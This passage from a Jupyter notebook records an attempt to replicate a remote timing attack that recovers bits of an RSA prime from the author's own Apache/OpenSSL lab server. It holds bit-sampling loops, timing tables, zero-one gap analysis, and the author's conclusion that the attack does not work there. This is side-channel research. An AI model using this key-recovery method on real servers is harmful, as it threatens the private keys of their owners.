     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "attack.sympy_integer_to_bits(peak_g)[0:BRUTEFORCED_BITS]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This gives a lower bound on `q`. To get an upper bound on `q`, note the following:\n",
    "  1. $q*p = N$\n",
    "  2. $q < p$\n",
    "\n",
    "From 1. and 2. it follows that $q < \\sqrt{N}$.\n",
    "\n",
    "(Suppose $q >= \\sqrt{N}$, then by 2. $p > \\sqrt{N}$ and so $ q*p > N$ which contradicts 1. Therefore $q < \\sqrt{N}$.)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(10055855947456947824680518748654384595609524365444295033292671082791323022555160232601405723625177570767523893639864538140315412108959927459825236754563072,\n",
       " 11522245995293453226444537667133610590574234209345464522156603069988519317090416103523895551843843150180734266788088596830720220822331432054108383719953516)"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lower_bound = peak_g\n",
    "upper_bound = sympy.Integer(sqrt_N.round())\n",
    "\n",
    "lower_bound, upper_bound"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's plot these two bounds on the graph:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7fb0c5fc4510>"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "lower_bound_relative_to_sqrt_n = round(float(lower_bound/sqrt_N), 10)\n",
    "upper_bound_relative_to_sqrt_n = round(float(upper_bound/sqrt_N), 10)\n",
    "\n",
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "\n",
    "plt.plot([lower_bound_relative_to_sqrt_n, lower_bound_relative_to_sqrt_n], ylim, color='orange')\n",
    "plt.plot([upper_bound_relative_to_sqrt_n, upper_bound_relative_to_sqrt_n], ylim, color='orange')\n",
    "\n",
    "if error:\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1+error) for y in samples['time']], color='lightblue')\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1-error) for y in samples['time']], color='lightblue')\n",
    "g.set(ylim=ylim)\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets consider the bit representations of these two bounds so we can set in stone the first few bits."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Lower Bound: [1, 1, 0, 0, 0]\n",
      "Upper Bound: [1, 1, 0, 1, 1]\n"
     ]
    }
   ],
   "source": [
    "print(\"Lower Bound:\", attack.sympy_integer_to_bits(lower_bound)[0:BRUTEFORCED_BITS])\n",
    "print(\"Upper Bound:\", attack.sympy_integer_to_bits(upper_bound)[0:BRUTEFORCED_BITS])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 1, 0]"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lower_bound_bits = attack.sympy_integer_to_bits(lower_bound)\n",
    "upper_bound_bits = attack.sympy_integer_to_bits(upper_bound)\n",
    "\n",
    "known_q_bits = []\n",
    "for i in range(BRUTEFORCED_BITS):\n",
    "    if lower_bound_bits[i] == upper_bound_bits[i]:\n",
    "        known_q_bits.append(lower_bound_bits[i])\n",
    "    else:\n",
    "        break\n",
    "        \n",
    "known_q_bits"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The above giving us the first bits of $q$.\n",
    "\n",
    "Since it is prime, we also know that $q$ is odd, and so its least significant bit is 1. We'll ignore that for now."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Recovering Bits of $q$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Run the iterative key recovery attack on bits 1, 2, and 3. We already know their true values, so there zero-one gaps can be used as reference points for the other bits."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "BITS_TO_RECOVER = 100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "q_bits = attack.sympy_integer_to_bits(q)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "bit_samples_filename = \"./measurements/bit-samples.txt\"\n",
    "bit_samples = pandas.DataFrame({\n",
    "    'bit_position': [],\n",
    "    'bit_value': [],\n",
    "    'point': [],\n",
    "    'time': [],\n",
    "})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\n",
      "1\n",
      "2\n",
      "3\n"
     ]
    }
   ],
   "source": [
    "bits = []\n",
    "for i in range(0, 4):\n",
    "    print(i)\n",
    "    \n",
    "    g_low_samples, g_high_samples = attack.sample_ith_bit(\n",
    "        q_bits,\n",
    "        i,\n",
    "        sample_size=SAMPLE_SIZE,\n",
    "        neighbourhood_size=NEIGHBOURHOOD_SIZE,\n",
    "    )\n",
    "        \n",
    "    g_low_samples['bit_position'] = i\n",
    "    g_low_samples['bit_value'] = 0\n",
    "    \n",
    "    g_high_samples['bit_position'] = i\n",
    "    g_high_samples['bit_value'] = 1\n",
    "    \n",
    "    bit_samples = pandas.concat([bit_samples, g_low_samples, g_high_samples], axis=0, sort=True)\n",
    "    \n",
    "bit_samples.to_csv(bit_samples_filename, sep=\" \")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "# @DAN: Plot the distributions like I did with the bruteforcing back in the day?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "There's a reasonable midpoint which could be used to separate the zeroes from the ones above. So lets continue and see what we get. Note that from here onwards, I've used the _correct_ bits of q, not the one the algorithm has picked, so there is a little cheating going on in the below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(4, BITS_TO_RECOVER):\n",
    "    print(i)\n",
    "    \n",
    "    g_low_samples, g_high_samples = attack.sample_ith_bit(\n",
    "        q_bits,\n",
    "        i,\n",
    "        sample_size=SAMPLE_SIZE,\n",
    "        neighbourhood_size=NEIGHBOURHOOD_SIZE,\n",
    "    )\n",
    "        \n",
    "    g_low_samples['bit_position'] = i\n",
    "    g_low_samples['bit_value'] = 0\n",
    "    \n",
    "    g_high_samples['bit_position'] = i\n",
    "    g_high_samples['bit_value'] = 1\n",
    "    \n",
    "    bit_samples = pandas.concat([bit_samples, g_low_samples, g_high_samples], axis=0, sort=True)\n",
    "    \n",
    "    if i%5 == 0:\n",
    "        bit_samples.to_csv(bit_samples_filename, sep=\" \")\n",
    "\n",
    "bit_samples.to_csv(bit_samples_filename, sep=\" \")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>bit_position</th>\n",
       "      <th>bit_value</th>\n",
       "      <th>point</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0</td>\n",
       "      <td>659238.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>3816809.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>2</td>\n",
       "      <td>3882911.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>3</td>\n",
       "      <td>3839911.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>4</td>\n",
       "      <td>3809069.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6399995</th>\n",
       "      <td>99.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1135386043712020434853942036135977879368661395...</td>\n",
       "      <td>3588344.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6399996</th>\n",
       "      <td>99.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1135386043712020434853942036135977879368661395...</td>\n",
       "      <td>3581249.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6399997</th>\n",
       "      <td>99.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1135386043712020434853942036135977879368661395...</td>\n",
       "      <td>3665748.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6399998</th>\n",
       "      <td>99.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1135386043712020434853942036135977879368661395...</td>\n",
       "      <td>3645503.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6399999</th>\n",
       "      <td>99.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1135386043712020434853942036135977879368661395...</td>\n",
       "      <td>3579131.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>6400000 rows × 4 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "         bit_position  bit_value  \\\n",
       "0                 0.0        0.0   \n",
       "1                 0.0        0.0   \n",
       "2                 0.0        0.0   \n",
       "3                 0.0        0.0   \n",
       "4                 0.0        0.0   \n",
       "...               ...        ...   \n",
       "6399995          99.0        1.0   \n",
       "6399996          99.0        1.0   \n",
       "6399997          99.0        1.0   \n",
       "6399998          99.0        1.0   \n",
       "6399999          99.0        1.0   \n",
       "\n",
       "                                                     point       time  \n",
       "0                                                        0   659238.0  \n",
       "1                                                        1  3816809.0  \n",
       "2                                                        2  3882911.0  \n",
       "3                                                        3  3839911.0  \n",
       "4                                                        4  3809069.0  \n",
       "...                                                    ...        ...  \n",
       "6399995  1135386043712020434853942036135977879368661395...  3588344.0  \n",
       "6399996  1135386043712020434853942036135977879368661395...  3581249.0  \n",
       "6399997  1135386043712020434853942036135977879368661395...  3665748.0  \n",
       "6399998  1135386043712020434853942036135977879368661395...  3645503.0  \n",
       "6399999  1135386043712020434853942036135977879368661395...  3579131.0  \n",
       "\n",
       "[6400000 rows x 4 columns]"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bit_samples = pandas.read_csv(bit_samples_filename, sep=\" \").drop(\"Unnamed: 0\", axis=1)\n",
    "bit_samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, collate the sample sets and neughbourhoods to provide a single measurement for each bit position and value combination."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>bit_position</th>\n",
       "      <th>bit_value</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>3.587081e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>3.588675e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>3.587605e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>3.588301e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>2.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>3.587818e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>195</th>\n",
       "      <td>97.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>3.588056e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>196</th>\n",
       "      <td>98.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>3.589364e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>197</th>\n",
       "      <td>98.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>3.594862e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>198</th>\n",
       "      <td>99.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>3.587579e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>199</th>\n",
       "      <td>99.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>3.589201e+06</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>200 rows × 3 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "     bit_position  bit_value          time\n",
       "0             0.0        0.0  3.587081e+06\n",
       "1             0.0        1.0  3.588675e+06\n",
       "2             1.0        0.0  3.587605e+06\n",
       "3             1.0        1.0  3.588301e+06\n",
       "4             2.0        0.0  3.587818e+06\n",
       "..            ...        ...           ...\n",
       "195          97.0        1.0  3.588056e+06\n",
       "196          98.0        0.0  3.589364e+06\n",
       "197          98.0        1.0  3.594862e+06\n",
       "198          99.0        0.0  3.587579e+06\n",
       "199          99.0        1.0  3.589201e+06\n",
       "\n",
       "[200 rows x 3 columns]"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bit_timings = bit_samples\\\n",
    "    .groupby([\"bit_position\", \"bit_value\", \"point\"]).median()\\\n",
    "    .groupby([\"bit_position\", \"bit_value\"]).mean()\\\n",
    "    .reset_index()\n",
    "\n",
    "bit_timings"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To replicate the paper, we calculate the zero-one gap for each bit position:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "bit_position\n",
       "0.0     1593.823125\n",
       "1.0      696.594063\n",
       "2.0      123.769687\n",
       "3.0     3126.372188\n",
       "4.0     1305.570312\n",
       "5.0       83.539687\n",
       "6.0       95.227500\n",
       "7.0     7916.380312\n",
       "8.0      850.309063\n",
       "9.0      959.875000\n",
       "10.0     962.936562\n",
       "dtype: float64"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def calc_zero_one_gap(row):\n",
    "    T_g_low = row[row['bit_value']==0]['time'].iloc[0]\n",
    "    T_g_high = row[row['bit_value']==1]['time'].iloc[0]\n",
    "    return abs(T_g_low-T_g_high)\n",
    "\n",
    "zero_one_gaps = bit_timings.groupby(\"bit_position\").apply(calc_zero_one_gap)\n",
    "zero_one_gaps[0:10]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Plot the gap for each bit position, with a color to denote its true value. Can we separate these into two distinct distributions?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f7acd140750>"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1242.11x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "seaborn.relplot(\n",
    "    data=pandas.DataFrame({\n",
    "        'True Value': q_bits[0:BITS_TO_RECOVER],\n",
    "        'Zero-One Gap': zero_one_gaps,\n",
    "        'Bit': range(0, BITS_TO_RECOVER),\n",
    "    }),\n",
    "    x='Bit',\n",
    "    y='Zero-One Gap',\n",
    "    hue='True Value',\n",
    "    kind='scatter',\n",
    "    height=8,\n",
    "    aspect=16/8,\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "No midpoint exists which allows us to separate the two groups. Intuitively, it looks like they come from the same distribution."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Further, even the highest zero-one gap is around 9000 cycles. That's only two to four times the range of values detected in the noise notebook. This indicates either the error is too high, the zero-one gap is too small, or no zero-one gap exists.\n",
    "\n",
    "Given the lack of peaks and troughs during the bruteforce stage, it looks like we aren't detecting any relationship between the input points `g` and the decryption time. \n",
    "\n",
    "The exception might be previous runs where we included `q` and `p` as inputs. In those clear and consistent dips could be found at the exact `p` and `q` points only.\n",
    "\n",
    "The evidence in this notebook suggests that the server isn't vulnerable to this attack.\n",
    "\n",
    "Possible issues I can think of:\n",
    "  1. Using a newer `gcc` modified the implementation such that this timing attack doesn't work anymore.\n",
    "  2. Noise from Docker/network stack.\n",
    "  3. Incorrect configuration of Apache + OpenSSL + `mod_ssl`.\n",
    "  4. Implementation of the actual attack is incorrect. I think this is the most likely issue.\n",
    "  \n",
    "Potential solves:\n",
    "  1. I started work on using gcc 2.9.6 (can be seen in the git history) but it was a hassle so I want avoid it for now. Further, these results were run against an OpenSSL compiled with optimisations turned off. I believe this is unlikely to be the primary cause of the issue.\n",
    "  2. Noise isn't the issue: we've measured the noise in the [noise notebook](noise.ipynb) and it isn't the issue.\n",
    "  3. Not sure how to solve this. Check documentation and installation scripts to ensure blinding isn't enabled.\n",
    "  4. I have found one other implementation of the attack code on GitHub. Run there attack against my server and plot the results. Do we get a good curve? Then the problem is with my attack, otherwise it's with the server (and possibly the attack as well). Compare the code and see how they differ.\n",
    "\n",
    "A potential improvement, though I don't think it will solve the overall problem, is to downclock the core running the server, while keeping the core of the attacking client at maximum. This will increase the relative accuracy of our timing measurements.\n",
    "  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Examining the relationship between neighbourhood size and zero-one gap\n",
    "\n",
    "Another option for distinguishing individual bits is to examine how the zero-one gap changes as we increase the neighbourhood size. In the paper, they take the sum over each neighbourhood to calculate $T_{g_{lo}}$ and $T_{g_{hi}}$. And they expect the zero-one gap to increase as the neighbourhood size increases for 0 bits. However, in this notebook w've been taking the mean over each neighbourhood. So we should, instead, look for the the 1 bits to approach 0 as the neighbourhood size increases. Let's see."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Neighbourhood Size</th>\n",
       "      <th>Zero Gap</th>\n",
       "      <th>One Gap</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>19759.279661</td>\n",
       "      <td>88540.329268</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>51</td>\n",
       "      <td>5901.747258</td>\n",
       "      <td>5285.220230</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>101</td>\n",
       "      <td>5098.251888</td>\n",
       "      <td>4303.467761</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>151</td>\n",
       "      <td>4574.230329</td>\n",
       "      <td>3866.196333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>201</td>\n",
       "      <td>4286.988869</td>\n",
       "      <td>3493.116066</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>251</td>\n",
       "      <td>3942.409548</td>\n",
       "      <td>3113.420659</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>301</td>\n",
       "      <td>3865.746410</td>\n",
       "      <td>3122.131310</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>351</td>\n",
       "      <td>3917.410015</td>\n",
       "      <td>3129.494337</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>401</td>\n",
       "      <td>3822.559407</td>\n",
       "      <td>3043.946749</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>451</td>\n",
       "      <td>3640.962832</td>\n",
       "      <td>2968.594911</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>501</td>\n",
       "      <td>3350.333097</td>\n",
       "      <td>2962.185264</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>551</td>\n",
       "      <td>3072.638808</td>\n",
       "      <td>2865.383427</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>601</td>\n",
       "      <td>2906.688894</td>\n",
       "      <td>2740.822187</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>651</td>\n",
       "      <td>2832.475761</td>\n",
       "      <td>2644.149938</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>701</td>\n",
       "      <td>2749.113071</td>\n",
       "      <td>2551.552434</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>751</td>\n",
       "      <td>2659.521429</td>\n",
       "      <td>2405.268341</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>801</td>\n",
       "      <td>2601.374923</td>\n",
       "      <td>2301.059499</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>851</td>\n",
       "      <td>2570.859298</td>\n",
       "      <td>2173.238787</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>901</td>\n",
       "      <td>2520.844448</td>\n",
       "      <td>2064.054925</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>951</td>\n",
       "      <td>2498.426349</td>\n",
       "      <td>1911.460965</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>1001</td>\n",
       "      <td>2396.438265</td>\n",
       "      <td>1875.063156</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>1051</td>\n",
       "      <td>2337.571852</td>\n",
       "      <td>1875.699717</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>1101</td>\n",
       "      <td>2283.792900</td>\n",
       "      <td>1821.830287</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>1151</td>\n",
       "      <td>2218.815194</td>\n",
       "      <td>1738.902344</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>1201</td>\n",
       "      <td>2210.195826</td>\n",
       "      <td>1662.633070</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>1251</td>\n",
       "      <td>2247.524320</td>\n",
       "      <td>1616.066610</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>1301</td>\n",
       "      <td>2307.431656</td>\n",
       "      <td>1508.911363</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>1351</td>\n",
       "      <td>2326.839102</td>\n",
       "      <td>1502.397005</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>1401</td>\n",
       "      <td>2313.180392</td>\n",
       "      <td>1512.071134</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>1451</td>\n",
       "      <td>2277.794058</td>\n",
       "      <td>1508.738347</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>1501</td>\n",
       "      <td>2239.296588</td>\n",
       "      <td>1537.999041</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>1551</td>\n",
       "      <td>2242.356424</td>\n",
       "      <td>1521.298289</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>32</th>\n",
       "      <td>1601</td>\n",
       "      <td>2254.115117</td>\n",
       "      <td>1527.075373</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    Neighbourhood Size      Zero Gap       One Gap\n",
       "0                    1  19759.279661  88540.329268\n",
       "1                   51   5901.747258   5285.220230\n",
       "2                  101   5098.251888   4303.467761\n",
       "3                  151   4574.230329   3866.196333\n",
       "4                  201   4286.988869   3493.116066\n",
       "5                  251   3942.409548   3113.420659\n",
       "6                  301   3865.746410   3122.131310\n",
       "7                  351   3917.410015   3129.494337\n",
       "8                  401   3822.559407   3043.946749\n",
       "9                  451   3640.962832   2968.594911\n",
       "10                 501   3350.333097   2962.185264\n",
       "11                 551   3072.638808   2865.383427\n",
       "12                 601   2906.688894   2740.822187\n",
       "13                 651   2832.475761   2644.149938\n",
       "14                 701   2749.113071   2551.552434\n",
       "15                 751   2659.521429   2405.268341\n",
       "16                 801   2601.374923   2301.059499\n",
       "17                 851   2570.859298   2173.238787\n",
       "18                 901   2520.844448   2064.054925\n",
       "19                 951   2498.426349   1911.460965\n",
       "20                1001   2396.438265   1875.063156\n",
       "21                1051   2337.571852   1875.699717\n",
       "22                1101   2283.792900   1821.830287\n",
       "23                1151   2218.815194   1738.902344\n",
       "24                1201   2210.195826   1662.633070\n",
       "25                1251   2247.524320   1616.066610\n",
       "26                1301   2307.431656   1508.911363\n",
       "27                1351   2326.839102   1502.397005\n",
       "28                1401   2313.180392   1512.071134\n",
       "29                1451   2277.794058   1508.738347\n",
       "30                1501   2239.296588   1537.999041\n",
       "31                1551   2242.356424   1521.298289\n",
       "32                1601   2254.115117   1527.075373"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = {\n",
    "    'Neighbourhood Size': [],\n",
    "    'Zero Gap': [],\n",
    "    'One Gap': [],\n",
    "}\n",
    "\n",
    "for neighbourhood_size in range(1, 1602, 50):\n",
    "    sample_sets = bit_samples.groupby([\"bit_position\", \"bit_value\", \"point\"]).median()\n",
    "    neighbourhoods = sample_sets.groupby([\"bit_position\", \"bit_value\"]).head(neighbourhood_size)\n",
    "    bit_timings = neighbourhoods.groupby([\"bit_position\", \"bit_value\"]).mean().reset_index()\n",
    "    \n",
    "    zero_one_gaps = bit_timings.groupby(\"bit_position\").apply(calc_zero_one_gap)\n",
    "    \n",
    "    zero_gaps = []\n",
    "    one_gaps = []\n",
    "    for bit_position in range(BITS_TO_RECOVER):\n",
    "        if q_bits[bit_position] == 0:\n",
    "            zero_gaps.append(zero_one_gaps[bit_position])\n",
    "        elif q_bits[bit_position] == 1:\n",
    "            one_gaps.append(zero_one_gaps[bit_position])\n",
    "    \n",
    "    zero_gaps = pandas.Series(zero_gaps)\n",
    "    one_gaps = pandas.Series(one_gaps)\n",
    "    \n",
